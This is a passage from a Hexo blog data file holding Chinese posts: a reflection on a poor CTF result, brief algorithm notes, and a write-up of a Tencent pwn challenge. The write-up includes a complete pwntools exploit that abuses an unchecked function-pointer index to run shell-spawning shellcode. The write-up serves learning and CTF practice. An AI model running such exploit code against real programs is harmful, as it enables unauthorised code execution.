0x01\n\n即使对队友有千万的不满，也没办法掩盖自己不够努力的实事。\n\n蓝莲花的队伍一年时间就拿到了DEFCON入围资格，打出了全球19名的成绩。40个月60场拼尽全力的比赛。一场比赛至少一天是通宵的。我原本以为自己已经够努力了，但，无论是和大佬们，还是和他校选手比较，真的还差太多。\n\n大二了，当初给自己定的目标也完成了大概。但依旧一无所成。\n\n## 0x03\n\n没办法，资源太少了，未来还是会读研的吧。也不再为高考找借口了，只是4年差距太难弥补了，尽力吧。\n\n## 0x04\n\n总的来说，第一次参加线下赛，玩的还是蛮开心的，但是一直被打并不觉得很爽= =。。。\n\n真是蛋疼的生活啊。。。","slug":"真是蛋疼的生活","published":1,"updated":"2017-09-06T05:53:39.009Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k4f0057hv18hjr7xzch","content":"<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>前两天南京线下赛结束，我校成绩惨淡。</p>\n<p>讲道理，不是我责怪队友，而是我真的没办法看着在我日夜奋战时看到他们在划水。平时训练中我对团队一直是放羊式的管理，始终认为激情与活力才是一个团队成功的最终要要素，而硬性的规定只不过是自欺欺人。</p>\n<p>但实事总是和我们想象的差太远了。</p>\n<p>我不明白还有什么方法能够挽救我们学校，挽救这个团队。一群没有能力，没有天赋，没有资源，没有创造力与激情的人组成的团队能走多远。我真的很羡慕那些有着可以并肩作战的队友的人，在你困难的时候可以给你鼓励，有勇气知难而上。我们可以一起研究一个问题到深夜，可以一起怼一道题目到把Google前十页的方法都试一遍，一个有技术氛围的团队，能够分享的团队，是1+1&gt;2的。</p>\n<p>志不同，道不合。</p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>即使对队友有千万的不满，也没办法掩盖自己不够努力的实事。</p>\n<p>蓝莲花的队伍一年时间就拿到了DEFCON入围资格，打出了全球19名的成绩。40个月60场拼尽全力的比赛。一场比赛至少一天是通宵的。我原本以为自己已经够努力了，但，无论是和大佬们，还是和他校选手比较，真的还差太多。</p>\n<p>大二了，当初给自己定的目标也完成了大概。但依旧一无所成。</p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>没办法，资源太少了，未来还是会读研的吧。也不再为高考找借口了，只是4年差距太难弥补了，尽力吧。</p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>总的来说，第一次参加线下赛，玩的还是蛮开心的，但是一直被打并不觉得很爽= =。。。</p>\n<p>真是蛋疼的生活啊。。。</p>\n","excerpt":"","more":"<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>前两天南京线下赛结束，我校成绩惨淡。</p>\n<p>讲道理，不是我责怪队友，而是我真的没办法看着在我日夜奋战时看到他们在划水。平时训练中我对团队一直是放羊式的管理，始终认为激情与活力才是一个团队成功的最终要要素，而硬性的规定只不过是自欺欺人。</p>\n<p>但实事总是和我们想象的差太远了。</p>\n<p>我不明白还有什么方法能够挽救我们学校，挽救这个团队。一群没有能力，没有天赋，没有资源，没有创造力与激情的人组成的团队能走多远。我真的很羡慕那些有着可以并肩作战的队友的人，在你困难的时候可以给你鼓励，有勇气知难而上。我们可以一起研究一个问题到深夜，可以一起怼一道题目到把Google前十页的方法都试一遍，一个有技术氛围的团队，能够分享的团队，是1+1&gt;2的。</p>\n<p>志不同，道不合。</p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>即使对队友有千万的不满，也没办法掩盖自己不够努力的实事。</p>\n<p>蓝莲花的队伍一年时间就拿到了DEFCON入围资格，打出了全球19名的成绩。40个月60场拼尽全力的比赛。一场比赛至少一天是通宵的。我原本以为自己已经够努力了，但，无论是和大佬们，还是和他校选手比较，真的还差太多。</p>\n<p>大二了，当初给自己定的目标也完成了大概。但依旧一无所成。</p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>没办法，资源太少了，未来还是会读研的吧。也不再为高考找借口了，只是4年差距太难弥补了，尽力吧。</p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>总的来说，第一次参加线下赛，玩的还是蛮开心的，但是一直被打并不觉得很爽= =。。。</p>\n<p>真是蛋疼的生活啊。。。</p>\n"},{"title":"简单算法","date":"2017-03-22T11:01:26.000Z","_content":"\n## 递归\n\n1. 斐波那契数列\n\n```\npublic static int fibonacci(int n)\n{\n\tif (n <= 1) return 1;\n    return fibonacci(n - 1) + fibonacci(n - 2);\n}\n```\n**应用**：\n\t+ 上楼梯\n\t+ 兔子繁殖\n\n注意边界条件\n\n2. Ackerman函数\n3. 汉诺塔问题\n\n## 分治\n\n基本步骤：\n\n\t+ 划分\n    + 求解子问题\n    + 合并\n\n**尽量划分伪相同大小的问题，当划分的子问题存在重复计算的情况时，考虑动态规划和贪心**\n\n## 贪心\n\n考虑最局部优解\n\n## 动态规划\n\n动态规划的性质：\n\t+ 找出最优解的性质\n    + 自顶向下的解决问题\n\n经典问题：\n\t+ 最长公共子序列\n\t+ 0-1背包问题\n    \n## 回溯剪枝\n\n分枝限界法（广度优先）\n\n经典问题：\n\t+ 八皇后问题\n    ","source":"_posts/简单算法.md","raw":"---\ntitle: 简单算法\ntags:\n  - 算法概述\ncategories: []\ndate: 2017-03-22 19:01:26\n---\n\n## 递归\n\n1. 斐波那契数列\n\n```\npublic static int fibonacci(int n)\n{\n\tif (n <= 1) return 1;\n    return fibonacci(n - 1) + fibonacci(n - 2);\n}\n```\n**应用**：\n\t+ 上楼梯\n\t+ 兔子繁殖\n\n注意边界条件\n\n2. Ackerman函数\n3. 汉诺塔问题\n\n## 分治\n\n基本步骤：\n\n\t+ 划分\n    + 求解子问题\n    + 合并\n\n**尽量划分伪相同大小的问题，当划分的子问题存在重复计算的情况时，考虑动态规划和贪心**\n\n## 贪心\n\n考虑最局部优解\n\n## 动态规划\n\n动态规划的性质：\n\t+ 找出最优解的性质\n    + 自顶向下的解决问题\n\n经典问题：\n\t+ 最长公共子序列\n\t+ 0-1背包问题\n    \n## 回溯剪枝\n\n分枝限界法（广度优先）\n\n经典问题：\n\t+ 八皇后问题\n    ","slug":"简单算法","published":1,"updated":"2017-03-22T13:10:35.592Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k4h005ahv18ahubd12d","content":"<h2 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h2><ol>\n<li>斐波那契数列</li>\n</ol>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">fibonacci</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (n &lt;= <span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> fibonacci(n - <span class=\"number\">1</span>) + fibonacci(n - <span class=\"number\">2</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p><strong>应用</strong>：</p>\n<pre><code>+ 上楼梯\n+ 兔子繁殖\n</code></pre><p>注意边界条件</p>\n<ol>\n<li>Ackerman函数</li>\n<li>汉诺塔问题</li>\n</ol>\n<h2 id=\"分治\"><a href=\"#分治\" class=\"headerlink\" title=\"分治\"></a>分治</h2><p>基本步骤：</p>\n<pre><code>+ 划分\n+ 求解子问题\n+ 合并\n</code></pre><p><strong>尽量划分伪相同大小的问题，当划分的子问题存在重复计算的情况时，考虑动态规划和贪心</strong></p>\n<h2 id=\"贪心\"><a href=\"#贪心\" class=\"headerlink\" title=\"贪心\"></a>贪心</h2><p>考虑最局部优解</p>\n<h2 id=\"动态规划\"><a href=\"#动态规划\" class=\"headerlink\" title=\"动态规划\"></a>动态规划</h2><p>动态规划的性质：</p>\n<pre><code>+ 找出最优解的性质\n+ 自顶向下的解决问题\n</code></pre><p>经典问题：</p>\n<pre><code>+ 最长公共子序列\n+ 0-1背包问题\n</code></pre><h2 id=\"回溯剪枝\"><a href=\"#回溯剪枝\" class=\"headerlink\" title=\"回溯剪枝\"></a>回溯剪枝</h2><p>分枝限界法（广度优先）</p>\n<p>经典问题：</p>\n<pre><code>+ 八皇后问题\n</code></pre>","excerpt":"","more":"<h2 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h2><ol>\n<li>斐波那契数列</li>\n</ol>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">fibonacci</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (n &lt;= <span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> fibonacci(n - <span class=\"number\">1</span>) + fibonacci(n - <span class=\"number\">2</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p><strong>应用</strong>：</p>\n<pre><code>+ 上楼梯\n+ 兔子繁殖\n</code></pre><p>注意边界条件</p>\n<ol>\n<li>Ackerman函数</li>\n<li>汉诺塔问题</li>\n</ol>\n<h2 id=\"分治\"><a href=\"#分治\" class=\"headerlink\" title=\"分治\"></a>分治</h2><p>基本步骤：</p>\n<pre><code>+ 划分\n+ 求解子问题\n+ 合并\n</code></pre><p><strong>尽量划分伪相同大小的问题，当划分的子问题存在重复计算的情况时，考虑动态规划和贪心</strong></p>\n<h2 id=\"贪心\"><a href=\"#贪心\" class=\"headerlink\" title=\"贪心\"></a>贪心</h2><p>考虑最局部优解</p>\n<h2 id=\"动态规划\"><a href=\"#动态规划\" class=\"headerlink\" title=\"动态规划\"></a>动态规划</h2><p>动态规划的性质：</p>\n<pre><code>+ 找出最优解的性质\n+ 自顶向下的解决问题\n</code></pre><p>经典问题：</p>\n<pre><code>+ 最长公共子序列\n+ 0-1背包问题\n</code></pre><h2 id=\"回溯剪枝\"><a href=\"#回溯剪枝\" class=\"headerlink\" title=\"回溯剪枝\"></a>回溯剪枝</h2><p>分枝限界法（广度优先）</p>\n<p>经典问题：</p>\n<pre><code>+ 八皇后问题\n</code></pre>"},{"title":"腾讯一道pwn题","date":"2017-02-07T21:09:51.000Z","_content":"\n## 漏洞发现\n\n```\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-14h]@1\n  int v5; // [sp+20h] [bp-10h]@1\n  int v6; // [sp+24h] [bp-Ch]@1\n  func v7; // [sp+28h] [bp-8h]@1\n  int v8; // [sp+2Ch] [bp-4h]@1\n\n  puts(\"Which method would you like to choose?\\n1. Add\\n2. Subtract\\n3. Multiply\\n4. Divide\");\n  fflush(stdout);\n  readIntegers(&v6, &v5);\n  printf(\"You chose: %d\\n\", v6);\n  puts(\"Enter two numbers to do math with, e.g. [123 110]\");\n  fflush(stdout);\n  readIntegers(&v5, &v4);\n  v7 = funcs[v6 - 1];\n  v8 = v7(v5, v4);\n  printf(\"Result is : %d\\n\", v8);\n  fflush(stdout);\n  return 0;\n}\n```\n\n选择加减乘除选项，通过一个函数指针数组实现（？不知道函数指针数组是不是就是这么实现的），没有检查偏移，可以控制偏移到我们的shellcode上。shellcode写在全局数组buf里。buf前四个字节写上buf+4的地址，buf+4写shellcode。\n\n程序的保护：\n\n```\npwndbg> checksec \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\nPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/ubuntu/workspace/nbw/tc\n```\n\n都没开，不过好像也没用到。\n\n里面的函数指针数组的实现（暂且这么称呼吧）还是蛮有意思的，贴一下：\n\n```\nmov     eax, [esp+24h]\nsub     eax, 1                                            // 刚开始忘了这里减1，坑了很久\nmov     eax, funcs[eax*4]                       //取func+eax*4的值，将这个值写为buf的地址的偏移  28+1\nmov     [esp+28h], eax\nmov     edx, [esp+1Ch]\nmov     eax, [esp+20h]\nmov     [esp+4], edx\nmov     [esp], eax\nmov     eax, [esp+28h]\ncall    eax\n```\n\n## exp\n\n```\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n# fun[v6 - 1]\n\nfunc_addr = 0x804A030\nbuf_addr = 0x804A0A0\nshellcode = shellcraft.i386.sh()\nshellcode = asm(shellcode)\n\noffset = (buf_addr - func_addr) / 4 + 1\npayload1 = str(offset)\npayload2 = p32(buf_addr + 4)\npayload2 += shellcode\n\np = process('./tc')\np.recvuntil('Divide\\n')\np.sendline(payload1)\np.recvuntil('110]\\n')\np.sendline(payload2)\np.interactive()\n```","source":"_posts/腾讯一道pwn题.md","raw":"---\ntitle: 腾讯一道pwn题\ntags:\n  - PWN\n  - writeup\ncategories: []\ndate: 2017-02-08 05:09:51\n---\n\n## 漏洞发现\n\n```\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-14h]@1\n  int v5; // [sp+20h] [bp-10h]@1\n  int v6; // [sp+24h] [bp-Ch]@1\n  func v7; // [sp+28h] [bp-8h]@1\n  int v8; // [sp+2Ch] [bp-4h]@1\n\n  puts(\"Which method would you like to choose?\\n1. Add\\n2. Subtract\\n3. Multiply\\n4. Divide\");\n  fflush(stdout);\n  readIntegers(&v6, &v5);\n  printf(\"You chose: %d\\n\", v6);\n  puts(\"Enter two numbers to do math with, e.g. [123 110]\");\n  fflush(stdout);\n  readIntegers(&v5, &v4);\n  v7 = funcs[v6 - 1];\n  v8 = v7(v5, v4);\n  printf(\"Result is : %d\\n\", v8);\n  fflush(stdout);\n  return 0;\n}\n```\n\n选择加减乘除选项，通过一个函数指针数组实现（？不知道函数指针数组是不是就是这么实现的），没有检查偏移，可以控制偏移到我们的shellcode上。shellcode写在全局数组buf里。buf前四个字节写上buf+4的地址，buf+4写shellcode。\n\n程序的保护：\n\n```\npwndbg> checksec \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\nPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/ubuntu/workspace/nbw/tc\n```\n\n都没开，不过好像也没用到。\n\n里面的函数指针数组的实现（暂且这么称呼吧）还是蛮有意思的，贴一下：\n\n```\nmov     eax, [esp+24h]\nsub     eax, 1                                            // 刚开始忘了这里减1，坑了很久\nmov     eax, funcs[eax*4]                       //取func+eax*4的值，将这个值写为buf的地址的偏移  28+1\nmov     [esp+28h], eax\nmov     edx, [esp+1Ch]\nmov     eax, [esp+20h]\nmov     [esp+4], edx\nmov     [esp], eax\nmov     eax, [esp+28h]\ncall    eax\n```\n\n## exp\n\n```\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n# fun[v6 - 1]\n\nfunc_addr = 0x804A030\nbuf_addr = 0x804A0A0\nshellcode = shellcraft.i386.sh()\nshellcode = asm(shellcode)\n\noffset = (buf_addr - func_addr) / 4 + 1\npayload1 = str(offset)\npayload2 = p32(buf_addr + 4)\npayload2 += shellcode\n\np = process('./tc')\np.recvuntil('Divide\\n')\np.sendline(payload1)\np.recvuntil('110]\\n')\np.sendline(payload2)\np.interactive()\n```","slug":"腾讯一道pwn题","published":1,"updated":"2017-02-07T21:27:16.166Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k4i005chv1899lq2e7o","content":"<h2 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-14h]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [sp+20h] [bp-10h]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v6; <span class=\"comment\">// [sp+24h] [bp-Ch]@1</span></div><div class=\"line\">  func v7; <span class=\"comment\">// [sp+28h] [bp-8h]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [sp+2Ch] [bp-4h]@1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Which method would you like to choose?\\n1. Add\\n2. Subtract\\n3. Multiply\\n4. Divide\"</span>);</div><div class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</div><div class=\"line\">  readIntegers(&amp;v6, &amp;v5);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"You chose: %d\\n\"</span>, v6);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Enter two numbers to do math with, e.g. [123 110]\"</span>);</div><div class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</div><div class=\"line\">  readIntegers(&amp;v5, &amp;v4);</div><div class=\"line\">  v7 = funcs[v6 - <span class=\"number\">1</span>];</div><div class=\"line\">  v8 = v7(v5, v4);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Result is : %d\\n\"</span>, v8);</div><div class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>选择加减乘除选项，通过一个函数指针数组实现（？不知道函数指针数组是不是就是这么实现的），没有检查偏移，可以控制偏移到我们的shellcode上。shellcode写在全局数组buf里。buf前四个字节写上buf+4的地址，buf+4写shellcode。</p>\n<p>程序的保护：</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; checksec </div><div class=\"line\">RELRO           <span class=\"keyword\">STACK</span> CANARY      NX            PIE             RPATH      RUNPATH      <span class=\"keyword\">FILE</span></div><div class=\"line\">Partial RELRO   <span class=\"keyword\">No</span> canary found   NX disabled   <span class=\"keyword\">No</span> PIE          <span class=\"keyword\">No</span> RPATH   <span class=\"keyword\">No</span> RUNPATH   /home/ubuntu/workspace/nbw/tc</div></pre></td></tr></table></figure>\n<p>都没开，不过好像也没用到。</p>\n<p>里面的函数指针数组的实现（暂且这么称呼吧）还是蛮有意思的，贴一下：</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">eax</span>, [<span class=\"built_in\">esp</span>+<span class=\"number\">24h</span>]</div><div class=\"line\"><span class=\"keyword\">sub</span>     <span class=\"built_in\">eax</span>, <span class=\"number\">1</span>                                            // 刚开始忘了这里减<span class=\"number\">1</span>，坑了很久</div><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">eax</span>, funcs[<span class=\"built_in\">eax</span>*<span class=\"number\">4</span>]                       //取func+<span class=\"built_in\">eax</span>*<span class=\"number\">4</span>的值，将这个值写为buf的地址的偏移  <span class=\"number\">28</span>+<span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">mov</span>     [<span class=\"built_in\">esp</span>+<span class=\"number\">28h</span>], <span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">edx</span>, [<span class=\"built_in\">esp</span>+<span class=\"number\">1Ch</span>]</div><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">eax</span>, [<span class=\"built_in\">esp</span>+<span class=\"number\">20h</span>]</div><div class=\"line\"><span class=\"keyword\">mov</span>     [<span class=\"built_in\">esp</span>+<span class=\"number\">4</span>], <span class=\"built_in\">edx</span></div><div class=\"line\"><span class=\"keyword\">mov</span>     [<span class=\"built_in\">esp</span>], <span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">eax</span>, [<span class=\"built_in\">esp</span>+<span class=\"number\">28h</span>]</div><div class=\"line\"><span class=\"keyword\">call</span>    <span class=\"built_in\">eax</span></div></pre></td></tr></table></figure>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight pony\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"></div><div class=\"line\"># <span class=\"function\"><span class=\"keyword\">fun</span>[<span class=\"title\">v6</span> - 1]</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">func_addr</span> = 0<span class=\"title\">x804A030</span></div><div class=\"line\"><span class=\"title\">buf_addr</span> = 0<span class=\"title\">x804A0A0</span></div><div class=\"line\"><span class=\"title\">shellcode</span> = <span class=\"title\">shellcraft</span>.<span class=\"title\">i386</span>.<span class=\"title\">sh</span>()</div><div class=\"line\"><span class=\"title\">shellcode</span> = <span class=\"title\">asm</span>(shellcode)</div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">offset</span> = (buf_addr - func_addr) / 4 + 1</div><div class=\"line\"><span class=\"title\">payload1</span> = <span class=\"title\">str</span>(offset)</div><div class=\"line\"><span class=\"title\">payload2</span> = <span class=\"title\">p32</span>(buf_addr + <span class=\"number\">4</span>)</div><div class=\"line\"><span class=\"title\">payload2</span> += <span class=\"title\">shellcode</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">p</span> = <span class=\"title\">process</span>('./tc')</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">recvuntil</span>('<span class=\"type\">Divide</span>\\n')</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">sendline</span>(payload1)</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">recvuntil</span>('<span class=\"number\">110</span>]\\n')</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">sendline</span>(payload2)</div><div class=\"line\"><span class=\"title\">p</span>.<span class=\"title\">interactive</span>()</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-14h]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [sp+20h] [bp-10h]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v6; <span class=\"comment\">// [sp+24h] [bp-Ch]@1</span></div><div class=\"line\">  func v7; <span class=\"comment\">// [sp+28h] [bp-8h]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [sp+2Ch] [bp-4h]@1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Which method would you like to choose?\\n1. Add\\n2. Subtract\\n3. Multiply\\n4. Divide\"</span>);</div><div class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</div><div class=\"line\">  readIntegers(&amp;v6, &amp;v5);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"You chose: %d\\n\"</span>, v6);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Enter two numbers to do math with, e.g. [123 110]\"</span>);</div><div class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</div><div class=\"line\">  readIntegers(&amp;v5, &amp;v4);</div><div class=\"line\">  v7 = funcs[v6 - <span class=\"number\">1</span>];</div><div class=\"line\">  v8 = v7(v5, v4);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Result is : %d\\n\"</span>, v8);</div><div class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>选择加减乘除选项，通过一个函数指针数组实现（？不知道函数指针数组是不是就是这么实现的），没有检查偏移，可以控制偏移到我们的shellcode上。shellcode写在全局数组buf里。buf前四个字节写上buf+4的地址，buf+4写shellcode。</p>\n<p>程序的保护：</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; checksec </div><div class=\"line\">RELRO           <span class=\"keyword\">STACK</span> CANARY      NX            PIE             RPATH      RUNPATH      <span class=\"keyword\">FILE</span></div><div class=\"line\">Partial RELRO   <span class=\"keyword\">No</span> canary found   NX disabled   <span class=\"keyword\">No</span> PIE          <span class=\"keyword\">No</span> RPATH   <span class=\"keyword\">No</span> RUNPATH   /home/ubuntu/workspace/nbw/tc</div></pre></td></tr></table></figure>\n<p>都没开，不过好像也没用到。</p>\n<p>里面的函数指针数组的实现（暂且这么称呼吧）还是蛮有意思的，贴一下：</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">eax</span>, [<span class=\"built_in\">esp</span>+<span class=\"number\">24h</span>]</div><div class=\"line\"><span class=\"keyword\">sub</span>     <span class=\"built_in\">eax</span>, <span class=\"number\">1</span>                                            // 刚开始忘了这里减<span class=\"number\">1</span>，坑了很久</div><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">eax</span>, funcs[<span class=\"built_in\">eax</span>*<span class=\"number\">4</span>]                       //取func+<span class=\"built_in\">eax</span>*<span class=\"number\">4</span>的值，将这个值写为buf的地址的偏移  <span class=\"number\">28</span>+<span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">mov</span>     [<span class=\"built_in\">esp</span>+<span class=\"number\">28h</span>], <span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">edx</span>, [<span class=\"built_in\">esp</span>+<span class=\"number\">1Ch</span>]</div><div class=\"line\"><span class=\"keyword\">mov</span>     <span class=\"built_in\">eax</span>, [<span class=\"built_in\">esp</span>+<span class=\"number\">20h</span>]</div><div class=\"line\"><span 